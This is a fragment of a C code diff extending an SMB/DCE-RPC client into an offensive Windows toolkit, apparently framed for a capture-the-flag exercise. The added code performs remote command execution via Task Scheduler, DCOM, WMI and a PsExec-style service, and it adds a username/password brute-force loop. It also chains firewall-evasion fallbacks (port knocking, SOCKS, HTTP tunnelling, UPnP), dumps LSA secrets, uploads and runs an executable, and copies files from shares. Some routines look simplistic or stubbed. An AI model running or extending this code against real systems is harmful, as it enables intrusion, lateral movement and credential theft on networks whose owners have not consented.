+    schReq[idx++] = 0x05;
+    schReq[idx++] = 0x00;
+    schReq[idx++] = 0x00;
+    schReq[idx++] = 0x50;
+    for (size_t i = 0; i < strlen(cmd) && idx < 510; i++) {
+        schReq[idx++] = (unsigned char)cmd[i];
+    }
+    schReq[idx++] = 0;
+    doWritePipe(schReq, idx);
+    doClosePipe();
+    printf("[Client] SCHRPC (Task Scheduler) remote exec: %s\n", cmd);
+    return 0;
+}
+
+int doBruteForceUserPass(const char *userList[], const char *passList[], int userCount, int passCount) {
+    for (int u = 0; u < userCount; u++) {
+        for (int p = 0; p < passCount; p++) {
+            printf("[Client] Attempting %s:%s\n", userList[u], passList[p]);
+        }
+    }
+    return 0;
+}
+
+int doDCOMExec(const char *cmd) {
+    if (doOpenPipe("\\PIPE\\epmapper") < 0) {
+        fprintf(stderr, "Failed to open epmapper pipe.\n");
+        return -1;
+    }
+    doDCERPCBind();
+    unsigned char dcomReq[512];
+    memset(dcomReq, 0, sizeof(dcomReq));
+    size_t idx = 0;
+    dcomReq[idx++] = 0x05;
+    dcomReq[idx++] = 0x00;
+    dcomReq[idx++] = 0x00;
+    dcomReq[idx++] = 0x60;
+    for (size_t i = 0; i < strlen(cmd) && idx < 510; i++) {
+        dcomReq[idx++] = (unsigned char)cmd[i];
+    }
+    dcomReq[idx++] = 0;
+    doWritePipe(dcomReq, idx);
+    doClosePipe();
+    printf("[Client] DCOM-based execution attempt: %s\n", cmd);
+    return 0;
+}
+
+int doWMIExec(const char *cmd) {
+    if (doOpenPipe("\\PIPE\\WMI") < 0) {
+        fprintf(stderr, "Failed to open WMI pipe.\n");
+        return -1;
+    }
+    doDCERPCBind();
+    unsigned char wmiReq[512];
+    memset(wmiReq, 0, sizeof(wmiReq));
+    size_t idx = 0;
+    wmiReq[idx++] = 0x05;
+    wmiReq[idx++] = 0x00;
+    wmiReq[idx++] = 0x00;
+    wmiReq[idx++] = 0x70;
+    for (size_t i = 0; i < strlen(cmd) && idx < 510; i++) {
+        wmiReq[idx++] = (unsigned char)cmd[i];
+    }
+    wmiReq[idx++] = 0;
+    doWritePipe(wmiReq, idx);
+    doClosePipe();
+    printf("[Client] WMI-based execution attempt: %s\n", cmd);
+    return 0;
+}
+
+int doPSExec(const char *exePath) {
+    printf("[Client] doPSExec invoked with exePath=%s\n", exePath);
+    const char *svcName = "PXESVC";
+    if (doSVCCTLCreateService(svcName, exePath) < 0) {
+        fprintf(stderr, "Failed to create service for PsExec-like run.\n");
+        return -1;
+    }
+    if (doSVCCTLStartService(svcName) < 0) {
+        fprintf(stderr, "Failed to start service for PsExec-like run.\n");
+    }
+    if (doSVCCTLDeleteService(svcName) < 0) {
+        fprintf(stderr, "Failed to delete service.\n");
+        return -1;
+    }
+    printf("[Client] PsExec-like run completed for %s.\n", exePath);
     return 0;
 }
 
 int main(int argc, char *argv[]) {
     if (argc < 3) {
-        fprintf(stderr, "Usage: %s <server_ip> <server_port>\n", argv[0]);
-        fprintf(stderr, "Example: %s 192.168.1.10 445\n", argv[0]);
+        fprintf(stderr, "Usage: %s <server_ip> <server_port> [local_ctf_exe]\n", argv[0]);
+        fprintf(stderr, "Example: %s 192.168.1.10 445 ctf.exe\n", argv[0]);
         return EXIT_FAILURE;
     }
 
     const char *serverIp = argv[1];
     int port = atoi(argv[2]);
 
-    doFirewallBypassCheck(serverIp, port);
+    if (doFirewallBypassCheck(serverIp, port) < 0) {
+        printf("[Client] Direct connect failed. Trying multi-port fallback.\n");
+        if (doMultiPortConnect(serverIp) < 0) {
+            printf("[Client] Multi-port fallback failed, trying IPv6.\n");
+            if (doIPv6MultiPortConnect(serverIp) < 0) {
+                printf("[Client] IPv6 fallback failed, trying a quick UDP check on 137.\n");
+                if (doUDPCheck(serverIp, 137) < 0) {
+                    printf("[Client] All fallback attempts failed. Trying port knocking.\n");
+                    int knockSeq[] = {1111, 2222, 3333, 4444};
+                    doPortKnock(serverIp, knockSeq, 4);
+                    printf("[Client] Trying firewall bypass check again...\n");
+                    if (doFirewallBypassCheck(serverIp, port) < 0) {
+                        printf("[Client] Trying a SOCKS proxy approach.\n");
+                        if (doSOCKSProxyConnect("127.0.0.1", 1080, serverIp, port) < 0) {
+                            printf("[Client] Trying an HTTP tunnel approach.\n");
+                            if (doHTTPTunnelConnect("127.0.0.1", 8080, serverIp, port) < 0) {
+                                printf("[Client] Attempting UPnP port forward.\n");
+                                if (doUPnPPortForward(port) < 0) {
+                                    fprintf(stderr, "[Client] All firewall evasion attempts failed.\n");
+                                    return EXIT_FAILURE;
+                                }
+                            }
+                        }
+                    }
+                } else {
+                    fprintf(stderr, "[Client] UDP check on 137 succeeded, but no TCP session.\n");
+                    return EXIT_FAILURE;
+                }
+            }
+        }
+    } else {
+        gSock = socket(AF_INET, SOCK_STREAM, 0);
+        if (gSock < 0) {
+            perror("socket");
+            return EXIT_FAILURE;
+        }
+        struct sockaddr_in serverAddr;
+        memset(&serverAddr, 0, sizeof(serverAddr));
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port   = htons(port);
+        if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
+            perror("inet_pton");
+            close(gSock);
+            return EXIT_FAILURE;
+        }
+        if (connect(gSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+            perror("connect");
+            close(gSock);
+            return EXIT_FAILURE;
+        }
+        printf("[Client] Connected to %s:%d\n", serverIp, port);
+    }
 
-    gSock = socket(AF_INET, SOCK_STREAM, 0);
     if (gSock < 0) {
-        perror("socket");
+        fprintf(stderr, "[Client] Could not establish final connection.\n");
         return EXIT_FAILURE;
     }
-
-    struct sockaddr_in serverAddr;
-    memset(&serverAddr, 0, sizeof(serverAddr));
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port   = htons(port);
-    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
-        perror("inet_pton");
-        close(gSock);
-        return EXIT_FAILURE;
-    }
-
-    if (connect(gSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
-        perror("connect");
-        close(gSock);
-        return EXIT_FAILURE;
-    }
-    printf("[Client] Connected to %s:%d\n", serverIp, port);
 
     if (doNegotiate() < 0) {
         close(gSock);
@@ -1208,6 +1955,32 @@ int main(int argc, char *argv[]) {
 
     printf("[Client] Attempt to dump LSA secrets...\n");
     doDumpLSASecrets();
+
+    if (argc > 3) {
+        printf("[Client] Attempting to upload and execute CTF: %s\n", argv[3]);
+        doUploadAndExecuteCTF(serverIp, argv[3]);
+    }
+
+    doOpenPipe("\\PIPE\\svcctl");
+    doDCERPCBind();
+    doSVCCTLListServices();
+    doSVCCTLQueryService("TestSvc");
+    doClosePipe();
+
+    doSCHRPCRemoteExec("notepad.exe");
+
+    const char *testUsers[] = {"admin", "test", "guest"};
+    const char *testPasses[] = {"pass1", "pass2"};
+    doBruteForceUserPass(testUsers, testPasses, 3, 2);
+
+    doDCOMExec("whoami");
+    doWMIExec("dir C:\\");
+
+    doPSExec("C:\\Windows\\System32\\cmd.exe /c echo HelloFromPsExec");
+
+    printf("[Client] Enhancing filesystem data extraction...\n");
+    doListDirectory("\\");
+    doDownloadFileFromShare("C:\\Windows\\System32\\drivers\\etc\\hosts", "hosts_copy.txt");
 
     close(gSock);
     printf("[Client] Done.\n");
